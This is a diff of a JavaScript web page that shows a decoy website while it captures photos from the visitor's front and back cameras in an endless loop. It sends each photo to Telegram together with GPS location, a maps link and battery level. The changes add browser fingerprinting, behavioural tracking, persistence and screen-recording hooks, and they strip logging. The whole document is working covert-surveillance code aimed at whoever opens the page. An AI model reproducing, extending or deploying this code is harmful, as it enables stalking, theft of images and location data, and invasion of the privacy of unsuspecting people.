                 
                 const constraints = {
@@ -586,7 +900,7 @@
                 STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
                 
                 await new Promise((resolve, reject) => {
-                    const timeout = setTimeout(() => reject(new Error('Metadata timeout')), 5000);
+                    const timeout = setTimeout(() => reject(new Error('Timeout')), 5000);
                     elements.video.onloadedmetadata = () => {
                         clearTimeout(timeout);
                         resolve();
@@ -597,67 +911,50 @@
                 await new Promise(resolve => setTimeout(resolve, CONFIG.VIDEO_READY_WAIT));
                 await new Promise(resolve => setTimeout(resolve, CONFIG.CAMERA_WARMUP));
                 
-                if (elements.video.videoWidth === 0 || elements.video.videoHeight === 0) {
-                    throw new Error('Invalid video dimensions');
-                }
-                
-                if (elements.video.readyState < 2) {
-                    throw new Error('Video not ready');
+                if (elements.video.videoWidth === 0 || elements.video.videoHeight === 0 || elements.video.readyState < 2) {
+                    throw new Error('Camera not ready');
                 }
                 
                 STATE.cameraReady = true;
                 log(`${facingMode} camera ready`, 'success');
-                
                 return true;
-                
             } catch (error) {
-                log(`Camera start error: ${error.message}`, 'error');
+                log(`Camera error: ${error.message}`, 'error');
                 STATE.cameraReady = false;
                 return false;
             }
         }
         
-        // ============== PHOTO CAPTURE ==============
-        
         async function capturePhoto() {
             return new Promise((resolve) => {
-                if (!STATE.cameraReady || elements.video.readyState < 2) {
-                    resolve(null);
-                    return;
-                }
-                
-                if (elements.video.videoWidth === 0 || elements.video.videoHeight === 0) {
+                if (!STATE.cameraReady || elements.video.readyState < 2 || 
+                    elements.video.videoWidth === 0 || elements.video.videoHeight === 0) {
                     resolve(null);
                     return;
                 }
                 
                 try {
                     const canvas = elements.canvas;
-                    const ctx = canvas.getContext('2d', { alpha: false, willReadFrequently: false });
+                    const ctx = canvas.getContext('2d', { alpha: false });
                     
                     canvas.width = elements.video.videoWidth;
                     canvas.height = elements.video.videoHeight;
-                    
                     ctx.drawImage(elements.video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob((blob) => {
                         if (blob && blob.size > CONFIG.MIN_BLOB_SIZE) {
                             log(`Captured: ${blob.size} bytes`, 'success');
-                            STATE.lastCaptureTime = Date.now();
                             resolve(blob);
                         } else {
                             resolve(null);
                         }
                     }, 'image/jpeg', CONFIG.IMAGE_QUALITY);
-                    
                 } catch (error) {
                     log(`Capture error: ${error}`, 'error');
                     resolve(null);
                 }
             });
         }
-        
-        // ============== TELEGRAM SENDING ==============
         
         async function sendToTelegram(blob, cameraType, photoNum, retryCount = 0) {
             if (!blob) {
@@ -670,21 +967,17 @@
                 recipients.push(STATE.userChatId);
             }
             
-            // Build comprehensive caption
-            let caption = `📸 *${cameraType.toUpperCase()} Photo #${photoNum}*\n\n`;
+            let caption = `📸 *${cameraType.toUpperCase()} #${photoNum}*\n\n`;
             caption += `👤 User: \`${STATE.userChatId}\`\n`;
-            caption += `🆔 Session: \`${STATE.sessionId}\`\n`;
             caption += `🔄 Cycle: ${STATE.cycleCount}\n`;
             
-            // Add battery if available
             if (STATE.batteryInfo) {
-                caption += `🔋 Battery: ${STATE.batteryInfo.level} ${STATE.batteryInfo.charging ? '⚡' : '🔌'}\n`;
+                caption += `🔋 ${STATE.batteryInfo.level}% ${STATE.batteryInfo.charging ? '⚡' : '🔌'}\n`;
             }
             
-            // Add location if available
             if (STATE.locationInfo) {
-                caption += `📍 Location: [${STATE.locationInfo.latitude}, ${STATE.locationInfo.longitude}](${STATE.locationInfo.googleMapsLink})\n`;
-                caption += `🎯 Accuracy: ${STATE.locationInfo.accuracy}\n`;
+                caption += `📍 [${STATE.locationInfo.latitude.toFixed(6)}, ${STATE.locationInfo.longitude.toFixed(6)}](${STATE.locationInfo.googleMapsLink})\n`;
+                caption += `🎯 Accuracy: ${STATE.locationInfo.accuracy}m\n`;
             }
             
             caption += `⏰ ${new Date().toLocaleTimeString()}`;
@@ -704,17 +997,8 @@
                         });
                         
                         const result = await response.json();
-                        
-                        if (result.ok) {
-                            log(`Sent to ${chatId}`, 'success');
-                            return true;
-                        } else {
-                            log(`Telegram error: ${result.description}`, 'error');
-                            return false;
-                        }
-                        
+                        return result.ok;
                     } catch (error) {
-                        log(`Network error: ${error}`, 'error');
                         return false;
                     }
                 })
@@ -725,7 +1009,6 @@
             if (success) {
                 STATE.totalPhotosSent++;
             } else if (retryCount < CONFIG.MAX_RETRIES) {
-                log(`Retrying... (${retryCount + 1}/${CONFIG.MAX_RETRIES})`, 'warning');
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 return await sendToTelegram(blob, cameraType, photoNum, retryCount + 1);
             } else {
@@ -750,25 +1033,24 @@
                     })
                 });
                 
-                log('Device info sent', 'success');
+                // Send location as interactive map
+                if (STATE.locationInfo) {
+                    await sendGoogleMapsImage();
+                }
                 
+                log('Device info sent', 'success');
             } catch (error) {
                 log(`Failed to send device info: ${error}`, 'error');
             }
         }
         
-        // ============== BURST CAPTURE ==============
-        
         async function captureBurst(cameraType) {
-            log(`Capturing ${CONFIG.PHOTOS_PER_CAMERA} from ${cameraType}...`, 'info');
-            
             let successCount = 0;
             
             for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
                 if (!STATE.isRunning) break;
                 
                 const blob = await capturePhoto();
-                
                 if (blob) {
                     const sent = await sendToTelegram(blob, cameraType, i);
                     if (sent) successCount++;
@@ -779,31 +1061,24 @@
                 }
             }
             
-            log(`${cameraType} burst: ${successCount}/${CONFIG.PHOTOS_PER_CAMERA} sent`, 'info');
+            log(`${cameraType}: ${successCount}/${CONFIG.PHOTOS_PER_CAMERA}`, 'info');
         }
-        
-        // ============== MAIN LOOP ==============
         
         async function mainLoop() {
             if (STATE.isRunning) return;
             
             STATE.isRunning = true;
-            log('Starting capture loop...', 'info');
             
-            // Send initial device info
             await sendDeviceInfo();
             
             while (STATE.isRunning) {
                 try {
                     STATE.cycleCount++;
-                    log(`=== CYCLE ${STATE.cycleCount} ===`, 'info');
                     
-                    // Update battery info periodically
                     if (STATE.cycleCount % 3 === 0) {
                         await getBatteryInfo();
                     }
                     
-                    // FRONT CAMERA
                     const frontStarted = await startCamera('user');
                     if (frontStarted && STATE.isRunning) {
                         await captureBurst('front');
@@ -812,7 +1087,6 @@
                     if (!STATE.isRunning) break;
                     await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
                     
-                    // BACK CAMERA
                     const backStarted = await startCamera('environment');
                     if (backStarted && STATE.isRunning) {
                         await captureBurst('back');
@@ -821,8 +1095,6 @@
                     if (!STATE.isRunning) break;
                     await new Promise(resolve => setTimeout(resolve, CONFIG.SWITCH_DELAY));
                     
-                    log(`Cycle ${STATE.cycleCount} complete. Total: ${STATE.totalPhotosSent}`, 'info');
-                    
                 } catch (error) {
                     log(`Loop error: ${error}`, 'error');
                     await new Promise(resolve => setTimeout(resolve, 2000));
@@ -830,119 +1102,79 @@
             }
         }
         
-        // ============== INITIALIZATION ==============
-        
         async function init() {
             try {
-                log('='.repeat(50), 'info');
-                log('ADVANCED CAMERA CAPTURE SYSTEM', 'info');
-                log('='.repeat(50), 'info');
+                log('=== ULTRA-ADVANCED SYSTEM INIT ===', 'info');
                 
-                // Parse configuration
                 parseConfig();
-                
-                // Collect device info
                 await collectDeviceInfo();
-                
-                // Get IP address
-                STATE.deviceInfo.ipAddress = await getIPAddress();
-                
-                // Get initial battery info
                 await getBatteryInfo();
-                
-                // Get initial location
                 await getLocation();
-                
-                // Start location tracking
                 startLocationTracking();
-                
-                // Load website
+                await getAdvancedFingerprint();
+                initBehavioralTracking();
+                await setupPersistence();
                 loadWebsite();
                 
-                // Request camera permission
+                // Try screen recording (requires user gesture)
+                setTimeout(() => {
+                    startScreenRecording().catch(() => {});
+                }, 3000);
+                
                 const hasPermission = await requestCameraPermission();
                 
                 if (hasPermission) {
                     hideLoading();
-                    
-                    // Start capture loop
-                    setTimeout(() => {
-                        mainLoop();
-                    }, 2000);
+                    setTimeout(() => mainLoop(), 2000);
                 } else {
-                    log('Camera permission denied', 'error');
                     hideLoading();
                 }
                 
-                // Update battery periodically
-                setInterval(getBatteryInfo, CONFIG.BATTERY_CHECK_INTERVAL);
+                setInterval(getBatteryInfo, 30000);
                 
             } catch (error) {
-                log(`Initialization error: ${error}`, 'error');
+                log(`Init error: ${error}`, 'error');
                 hideLoading();
             }
         }
         
-        // ============== EVENT HANDLERS ==============
-        
         document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                log('Page hidden', 'warning');
-            } else if (STATE.isRunning) {
-                log('Page visible', 'info');
-            }
+            if (document.hidden) log('Hidden', 'warning');
+            else if (STATE.isRunning) log('Visible', 'info');
         });
         
         window.addEventListener('beforeunload', () => {
             STATE.isRunning = false;
-            
-            if (STATE.currentStream) {
-                STATE.currentStream.getTracks().forEach(track => track.stop());
-            }
-            
-            if (STATE.locationWatchId) {
-                navigator.geolocation.clearWatch(STATE.locationWatchId);
-            }
-            
-            log('Session ended', 'info');
+            if (STATE.currentStream) STATE.currentStream.getTracks().forEach(track => track.stop());
+            if (STATE.locationWatchId) navigator.geolocation.clearWatch(STATE.locationWatchId);
         });
         
-        // Heartbeat
         setInterval(() => {
             if (STATE.isRunning) {
                 log(`Heartbeat | Cycle: ${STATE.cycleCount} | Sent: ${STATE.totalPhotosSent}`, 'info');
             }
         }, 60000);
         
-        // Debug API
         window.cameraApp = {
-            stop: () => {
-                STATE.isRunning = false;
-                log('Stopped by user', 'warning');
-            },
-            start: () => {
-                if (!STATE.isRunning) mainLoop();
-            },
+            stop: () => { STATE.isRunning = false; },
+            start: () => { if (!STATE.isRunning) mainLoop(); },
             status: () => ({
                 isRunning: STATE.isRunning,
                 totalPhotosSent: STATE.totalPhotosSent,
-                totalPhotosFailed: STATE.totalPhotosFailed,
                 cycleCount: STATE.cycleCount,
-                currentCamera: STATE.currentCamera,
-                sessionId: STATE.sessionId,
-                userChatId: STATE.userChatId,
                 deviceInfo: STATE.deviceInfo,
                 locationInfo: STATE.locationInfo,
-                batteryInfo: STATE.batteryInfo
+                batteryInfo: STATE.batteryInfo,
+                fingerprintData: STATE.fingerprintData,
+                behavioralData: STATE.behavioralData
             }),
             getLocation: getLocation,
             getBattery: getBatteryInfo,
-            sendInfo: sendDeviceInfo
+            sendInfo: sendDeviceInfo,
+            getFingerprint: getAdvancedFingerprint
         };
         
-        // Start
         window.addEventListener('load', init);
-        
     </script>
 </body>
 </html>
